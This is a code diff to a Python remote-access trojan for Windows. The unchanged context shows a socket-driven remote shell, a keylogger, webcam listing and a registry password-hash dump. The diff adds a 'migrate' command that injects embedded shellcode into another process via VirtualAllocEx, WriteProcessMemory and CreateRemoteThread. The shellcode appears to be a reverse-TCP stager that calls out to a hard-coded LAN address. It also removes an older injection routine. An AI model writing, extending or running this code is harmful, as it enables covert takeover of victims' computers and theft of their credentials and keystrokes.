@@ -12,8 +12,8 @@ import io  # For in-memory byte streams
 import winreg  # For accessing the Windows registry
 import hashlib  # For calculating the hboot key
 import binascii  # For converting to/from binary and ASCII
-import ctypes  # For migrating processes
-from ctypes import wintypes
+import os  # For process management
+import ctypes  # For Windows API calls
 
 # Function to get the default network interface
 def get_default_interface():
@@ -94,10 +94,82 @@ def shell(client_socket):
             command = client_socket.recv(1024).decode('utf-8')
             if command.lower() == "exit":
                 break
-            output = subprocess.run(command, shell=True, capture_output=True, text=True)
-            client_socket.send(output.stdout.encode('utf-8') or b"Command executed, but no output.")
+            elif command.lower().startswith("migrate"):
+                try:
+                    target_process = command.split(' ')[1]
+                    current_process = psutil.Process()
+                    current_process_id = current_process.pid
+                    client_socket.send(f"[*] Running module against {socket.gethostname()}\n".encode('utf-8'))
+                    client_socket.send(f"[*] Current server process: {current_process.name()} ({current_process_id})\n".encode('utf-8'))
+                    client_socket.send(f"[*] Migrating to {target_process}...\n".encode('utf-8'))
+                    # Attempt to migrate to the target process
+                    for proc in psutil.process_iter(['pid', 'name']):
+                        if proc.info['name'] == target_process:
+                            target_process_id = proc.info['pid']
+                            client_socket.send(f"[*] Migrating into process ID {target_process_id}\n".encode('utf-8'))
+                            migrate_to_process(target_process_id)
+                            client_socket.send(f"[*] New server process: {target_process} ({target_process_id})\n".encode('utf-8'))
+                            break
+                    else:
+                        client_socket.send(f"[*] Target process {target_process} not found.\n".encode('utf-8'))
+                except Exception as e:
+                    client_socket.send(f"[*] Migration error: {e}\n".encode('utf-8'))
+            else:
+                output = subprocess.run(command, shell=True, capture_output=True, text=True)
+                client_socket.send(output.stdout.encode('utf-8') or b"Command executed, but no output.")
         except Exception as e:
             client_socket.send(str(e).encode('utf-8'))
+
+def migrate_to_process(target_pid):
+    # Windows-specific process migration using Win32 API
+    PROCESS_ALL_ACCESS = 0x1F0FFF
+    kernel32 = ctypes.windll.kernel32
+
+    # Shellcode to inject
+    shellcode = (
+        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+        b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+        b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
+        b"\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48"
+        b"\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b"
+        b"\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
+        b"\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24"
+        b"\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
+        b"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f"
+        b"\x5a\x8b\x12\xe9\x86\x00\x00\x00\x5d\x68\x33\x32\x00\x00\x68"
+        b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
+        b"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x05"
+        b"\x68\xc0\xa8\x01\x64\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50"
+        b"\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02"
+        b"\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff"
+        b"\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00"
+        b"\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58"
+        b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
+        b"\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3"
+    )
+
+    # Get a handle to the target process
+    target_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
+    if not target_handle:
+        raise Exception(f"Unable to open target process. Error code: {kernel32.GetLastError()}")
+
+    # Allocate memory in the target process
+    remote_memory = kernel32.VirtualAllocEx(target_handle, None, len(shellcode), 0x3000, 0x40)
+    if not remote_memory:
+        raise Exception(f"Unable to allocate memory in target process. Error code: {kernel32.GetLastError()}")
+
+    # Write the shellcode to the allocated memory
+    written = ctypes.c_size_t(0)
+    if not kernel32.WriteProcessMemory(target_handle, remote_memory, shellcode, len(shellcode), ctypes.byref(written)):
+        raise Exception(f"Unable to write to target process memory. Error code: {kernel32.GetLastError()}")
+
+    # Create a remote thread to execute the shellcode
+    thread_id = ctypes.c_ulong(0)
+    if not kernel32.CreateRemoteThread(target_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id)):
+        raise Exception(f"Unable to create remote thread in target process. Error code: {kernel32.GetLastError()}")
+
+    # Close the target process handle
+    kernel32.CloseHandle(target_handle)
 
 def keylogger_callback(event):
     global keylogger_data
@@ -199,101 +271,6 @@ def dump_password_hashes(decrypted_keys):
         hashes += f"{user_key}: {hash_value}\n"
     return hashes
 
-# Windows API constants and structures
-PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
-MEM_COMMIT = 0x1000
-MEM_RESERVE = 0x2000
-PAGE_EXECUTE_READWRITE = 0x40
-
-class STARTUPINFO(ctypes.Structure):
-    _fields_ = [("cb", wintypes.DWORD),
-                ("lpReserved", wintypes.LPWSTR),
-                ("lpDesktop", wintypes.LPWSTR),
-                ("lpTitle", wintypes.LPWSTR),
-                ("dwX", wintypes.DWORD),
-                ("dwY", wintypes.DWORD),
-                ("dwXSize", wintypes.DWORD),
-                ("dwYSize", wintypes.DWORD),
-                ("dwXCountChars", wintypes.DWORD),
-                ("dwYCountChars", wintypes.DWORD),
-                ("dwFillAttribute", wintypes.DWORD),
-                ("dwFlags", wintypes.DWORD),
-                ("wShowWindow", wintypes.WORD),
-                ("cbReserved2", wintypes.WORD),
-                ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
-                ("hStdInput", wintypes.HANDLE),
-                ("hStdOutput", wintypes.HANDLE),
-                ("hStdError", wintypes.HANDLE)]
-
-class PROCESS_INFORMATION(ctypes.Structure):
-    _fields_ = [("hProcess", wintypes.HANDLE),
-                ("hThread", wintypes.HANDLE),
-                ("dwProcessId", wintypes.DWORD),
-                ("dwThreadId", wintypes.DWORD)]
-
-def migrate(client_socket, target_process_name):
-    try:
-        # Get the current process information
-        current_process = psutil.Process()
-        current_process_name = current_process.name()
-        current_process_id = current_process.pid
-
-        client_socket.send(f"[*] Running module against {socket.gethostname()}\n".encode('utf-8'))
-        client_socket.send(f"[*] Current server process: {current_process_name} ({current_process_id})\n".encode('utf-8'))
-
-        # Find the target process to migrate to
-        target_process = None
-        for proc in psutil.process_iter(['name', 'pid']):
-            if proc.info['name'] == target_process_name:
-                target_process = proc
-                break
-
-        if target_process is None:
-            client_socket.send(f"[*] Target process {target_process_name} not found.\n".encode('utf-8'))
-            return
-
-        target_process_id = target_process.info['pid']
-        client_socket.send(f"[*] Migrating to {target_process_name}...\n".encode('utf-8'))
-        client_socket.send(f"[*] Migrating into process ID {target_process_id}\n".encode('utf-8'))
-
-        # Open the target process
-        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_process_id)
-        if not h_process:
-            client_socket.send(f"Error: Could not open target process {target_process_name} ({target_process_id}).\n".encode('utf-8'))
-            return
-
-        # Allocate memory in the target process
-        allocation = ctypes.windll.kernel32.VirtualAllocEx(h_process, 0, ctypes.sizeof(ctypes.c_void_p), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-        if not allocation:
-            client_socket.send(f"Error: Could not allocate memory in target process.\n".encode('utf-8'))
-            ctypes.windll.kernel32.CloseHandle(h_process)
-            return
-
-        # Write the payload to the allocated memory
-        payload = b"\x90" * 100  # Example payload (NOP sled), replace with actual payload
-        written = ctypes.c_size_t(0)
-        if not ctypes.windll.kernel32.WriteProcessMemory(h_process, allocation, payload, len(payload), ctypes.byref(written)):
-            client_socket.send(f"Error: Could not write to allocated memory in target process.\n".encode('utf-8'))
-            ctypes.windll.kernel32.VirtualFreeEx(h_process, allocation, 0, MEM_RELEASE)
-            ctypes.windll.kernel32.CloseHandle(h_process)
-            return
-
-        # Create a remote thread in the target process to execute the payload
-        thread_id = wintypes.DWORD(0)
-        if not ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, allocation, None, 0, ctypes.byref(thread_id)):
-            client_socket.send(f"Error: Could not create remote thread in target process.\n".encode('utf-8'))
-            ctypes.windll.kernel32.VirtualFreeEx(h_process, allocation, 0, MEM_RELEASE)
-            ctypes.windll.kernel32.CloseHandle(h_process)
-            return
-
-        client_socket.send(f"[*] New server process: {target_process_name} ({target_process_id})\n".encode('utf-8'))
-
-        # Close handles
-        ctypes.windll.kernel32.CloseHandle(h_process)
-
-    except Exception as e:
-        client_socket.send(f"Error: {e}\n".encode('utf-8'))
-
 def main():
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -325,9 +302,6 @@ def main():
                 client_socket.send(webcam_list.encode('utf-8'))
             elif command == "hashdump":
                 hashdump(client_socket)
-            elif command.startswith("migrate"):
-                _, target_process_name = command.split(" ", 1)
-                migrate(client_socket, target_process_name)
         except Exception as e:
             print(f"Error: {e}")
             break
